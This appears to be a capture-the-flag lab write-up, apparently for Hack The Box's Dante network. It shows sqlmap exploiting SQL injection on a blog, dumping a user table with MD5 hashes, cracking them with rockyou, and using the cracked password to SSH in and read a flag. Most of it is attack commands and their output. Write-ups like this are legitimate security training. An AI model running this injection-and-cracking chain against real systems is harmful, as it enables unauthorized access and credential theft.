# Leteral Movement
## 172.16.1.12
### DB Enumeration
```
$ proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D blog_admin_db --tables
```
```bash
Database: blog_admin_db                                                                                                                                                    
[13 tables]
+-----------------------------+
| banner_posts                |
| blog_categories             |
| blogs                       |
| editors_choice              |
| links                       |
| membership_grouppermissions |
| membership_groups           |
| membership_userpermissions  |
| membership_userrecords      |
| membership_users            |
| page_hits                   |
| titles                      |
| visitor_info                |
+-----------------------------+
```
```
$ proxychains sqlmap -u http://172.16.1.12/blog/category.php?id=2 -D blog_admin_db -T membership_users --dump
```
```bash
[02:23:36] [INFO] using hash method 'md5_generic_passwd'
[02:23:36] [INFO] resuming password 'admin' for hash '21232f297a57a5a743894a0e4a801fc3'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 2
what's the custom dictionary's location?
> /usr/share/wordlists/rockyou.txt
[02:23:45] [INFO] using custom dictionary
do you want to use common password suffixes? (slow!) [y/N] 

[02:23:48] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[02:23:48] [INFO] starting 2 processes 
[02:26:15] [INFO] cracked password 'Welcometomyblog' for hash '442179ad1de9c25593cabf625c0badb7'                                                                           
Database: blog_admin_db                                                                                                                                                    
Table: membership_users
[4 entries]
+---------+----------+----------------+---------+---------+---------+---------+----------------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+
| groupID | memberID | email          | custom1 | custom2 | custom3 | custom4 | passMD5                                            | comments                                                                                     | isBanned | isApproved | signupDate | pass_reset_key | pass_reset_expiry |
+---------+----------+----------------+---------+---------+---------+---------+----------------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+
| 2       | admin    | <blank>        | NULL    | NULL    | NULL    | NULL    | 21232f297a57a5a743894a0e4a801fc3 (admin)           | Admin member created automatically on 2018-04-26\nRecord updated automatically on 2018-04-27 | 0        | 1          | 2018-04-26 | NULL           | NULL              |
| NULL    | ben      | ben@dante.htb  | NULL    | NULL    | NULL    | NULL    | 442179ad1de9c25593cabf625c0badb7 (Welcometomyblog) | NULL                                                                                         | NULL     | NULL       | NULL       | NULL           | NULL              |
| 3       | egre55   | egre55@htb.com | egre55  | a       | a       | a       | d6501933a2e0ea1f497b87473051417f                   | member signed up through the registration form.                                              | 0        | 1          | 2020-08-05 | NULL           | NULL              |
| 1       | guest    | NULL           | NULL    | NULL    | NULL    | NULL    | NULL                                               | Anonymous member created automatically on 2018-04-26                                         | 0        | 1          | 2018-04-26 | NULL           | NULL              |
+---------+----------+----------------+---------+---------+---------+---------+----------------------------------------------------+----------------------------------------------------------------------------------------------+----------+------------+------------+----------------+-------------------+

[02:27:39] [INFO] table 'blog_admin_db.membership_users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/172.16.1.12/dump/blog_admin_db/membership_users.csv'
[02:27:39] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/172.16.1.12'

[*] ending @ 02:27:39 /2024-03-03/
```

### SSH Login
```bash
$ proxychains ssh -D 1080 ben@172.16.1.12
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.12:22  ...  OK
The authenticity of host '172.16.1.12 (172.16.1.12)' can't be established.
ED25519 key fingerprint is SHA256:XeJgnh2gzqE2SPuygySuBLdxtTzyNCnaz8BQ9D0mC0U.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.1.12' (ED25519) to the list of known hosts.
ben@172.16.1.12's password: Welcometomyblog
bind [127.0.0.1]:1080: Address already in use
channel_setup_fwd_listener_tcpip: cannot listen to port: 1080
Could not request local forwarding.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

270 packages can be updated.
146 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Tue Dec  8 05:17:48 2020 from 10.100.1.2
ben@DANTE-NIX04:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),46(plugdev)
ben@DANTE-NIX04:~$ ls
Desktop  Documents  Downloads  examples.desktop  flag.txt  Music  Pictures  Public  Templates  Videos
ben@DANTE-NIX04:~$ cat flag.txt 
DANTE{Pretty_Horrific_PH4IL!}
```